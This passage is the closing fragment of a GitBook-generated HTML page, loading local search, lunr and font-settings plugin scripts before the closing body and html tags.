    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

